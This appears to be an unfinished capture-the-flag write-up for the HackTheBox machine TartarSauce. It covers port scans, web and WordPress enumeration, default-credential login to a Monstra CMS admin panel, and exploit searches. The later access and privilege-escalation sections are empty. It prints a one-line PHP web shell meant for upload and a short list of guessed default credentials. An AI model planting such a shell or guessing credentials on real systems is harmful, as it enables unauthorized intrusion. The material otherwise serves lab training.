---
description: 10.10.10.88
---

# TartarSauce

![](<../../.gitbook/assets/1 (4).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User -&#x20;
* Root -&#x20;

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.88                                             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 06:16 EDT
Nmap scan report for 10.10.10.88
Host is up (0.067s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.36 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -A -p 80 10.10.10.88 -n
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-05 06:21 EDT
Nmap scan report for 10.10.10.88
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Landing Page
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.12 (93%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   14.60 ms 10.10.14.1
2   14.78 ms 10.10.10.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.27 seconds
```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.88 
http://10.10.10.88 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.88], Title[Landing Page] 
```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.88 -C all 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.88
+ Target Hostname:    10.10.10.88
+ Target Port:        80
+ Start Time:         2021-11-05 06:28:11 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Entry '/webservices/monstra-3.0.4/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 5 entries which should be manually viewed.
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2a0e, size: 565becf5ff08d, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26488 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-11-05 06:37:29 (GMT-4) (558 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

Let's run a gobuster scan against the target.

```
─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88 -t 50 -q
/webservices (Status: 301)
/server-status (Status: 403)

```

### Dirb

Let's run a dirb scan against the target.

```
// Some code
```

### Website exploration

#### ​ ​Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* There is a robots.txt with 5 disallowed entries, which leads us to the Monstra CMS (v3.0.4)
* There is an admin page here: [http://10.10.10.88/webservices/monstra-3.0.4/admin/](http://10.10.10.88/webservices/monstra-3.0.4/admin/)
* The site issues a PHPSESSID cookie (unauthenticated)
* Dirb also found a Wordpress site: [http://10.10.10.88/webservices/wp/](http://10.10.10.88/webservices/wp/), page source has links to tartarsauce.htb

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing obvious found, seems to be using the default CMS scripts

### Monstra CMS

Let's try login to the admin page with some default cred options: [http://10.10.10.88/webservices/monstra-3.0.4/admin/](http://10.10.10.88/webservices/monstra-3.0.4/admin/)

> root:root
>
> root:password
>
> admin:admin
>
> admin:password

Nice, we are able to login using the following creds - admin:admin

The system provides server, directory and other information, as shown below:

![](<../../.gitbook/assets/2 (1).JPG>)

![](<../../.gitbook/assets/3 (1).JPG>)

Let's check the exploit database with searchsploit:

```
└─$ searchsploit monstra 3.0.4
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Executi | php/webapps/43348.txt
Monstra CMS 3.0.4 - Arbitrary Folder Deletion                                   | php/webapps/44512.txt
Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload                         | php/webapps/48479.txt
Monstra cms 3.0.4 - Persitent Cross-Site Scripting                              | php/webapps/44502.txt
Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)                       | php/webapps/49949.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                                  | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                                  | php/webapps/44646.txt
Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)              | php/webapps/45164.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

There are a few options here. Since we are logged in, we can use one of the exploits that gives us RCE, specifically, EDB-ID 43348. Let's copy this file to the working directory and review it. According to the exploit, we can simply upload a PHP script with a file extention of PHP (all caps) or php7 to bypass the upload restrictions. We should then be able to access the uploaded file and get code execution. First, let's create the script to upload:

```
└─$ cat shell.php7            
<?php

 $cmd=$_GET['cmd'];
 system($cmd);

?>

```

After following the instructions, it appears that the file upload feature does not work. This could be a rabbit hole. Let's move on for now and come back to this later if we get stuck.

After browsing the admin site a bit more, we find the plugins page, which lists the installed plugins. There is however also an option to install the "Sandbox" plugin. Let's go ahead and do that and see what we get.

![](<../../.gitbook/assets/6 (1).JPG>)









### Wordpress & Wpscan

The page at [http://10.10.10.88/webservices/wp/](http://10.10.10.88/webservices/wp/) loads, but not properly.&#x20;

![](<../../.gitbook/assets/4 (1).JPG>)

Let's add tartarsauce.htb to /etc/hosts and retry.

![](<../../.gitbook/assets/5 (1).JPG>)

Let's run wpscan next to see what we get:

```
└─$ wpscan --url http://tartarsauce.htb/webservices/wp/ --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' --api-token api_token_here -e ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://tartarsauce.htb/webservices/wp/ [10.10.10.88]
[+] Started: Fri Nov  5 07:40:13 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://tartarsauce.htb/webservices/wp/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://tartarsauce.htb/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tartarsauce.htb/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://tartarsauce.htb/webservices/wp/index.php/feed/, <generator>https://wordpress.org/?v=4.9.4</generator>
 |  - http://tartarsauce.htb/webservices/wp/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.9.4</generator>
 |
 | [!] 32 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpscan.com/vulnerability/5e0c1ddd-fdd0-421b-bdbe-3eee6b75c919
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/835614a2-ad92-4027-b485-24b39038171d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/01b587e0-0a86-47af-a088-6e5e350e8247
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/2b7c77c3-8dbc-4a2a-9ea3-9929c3373557
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.9.7
 |     References:
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/999dba5a-82fb-4717-89c3-6ed723cc7e45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/046ff6a0-90b2-4251-98fc-b7fba93f8334
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/3182002e-d831-4412-a27d-a5e39bb44314
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/7f7a0795-4dd7-417d-804e-54f12595d1e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/65f1aec4-6d28-4396-88d7-66702b21c7a2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/d741f5ae-52ca-417d-a2ca-acdfb7ca5808
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/1a693e57-f99c-4df6-93dd-0cdc92fd0526
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.10
 |     References:
 |      - https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.9.11
 |     References:
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 4.9.17
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 4.9.18
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM

[+] WordPress theme in use: voce
 | Location: http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/
 | Latest Version: 1.1.0 (up to date)
 | Last Updated: 2017-09-01T00:00:00.000Z
 | Readme: http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/readme.txt
 | Style URL: http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/style.css?ver=4.9.4
 | Style Name: voce
 | Style URI: http://limbenjamin.com/pages/voce-wp.html
 | Description: voce is a minimal theme, suitable for text heavy articles. The front page features a list of recent ...
 | Author: Benjamin Lim
 | Author URI: https://limbenjamin.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tartarsauce.htb/webservices/wp/wp-content/themes/voce/style.css?ver=4.9.4, Match: 'Version: 1.1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Fri Nov  5 07:40:18 2021
[+] Requests Done: 35
[+] Cached Requests: 5
[+] Data Sent: 9.543 KB
[+] Data Received: 112.744 KB
[+] Memory used: 220.051 MB
[+] Elapsed time: 00:00:04

```







## Gaining Access

​ ​ ​

## Privilege Escalation

​ ​ ​ ​ ​ ​

## Resources

​ ​ ​
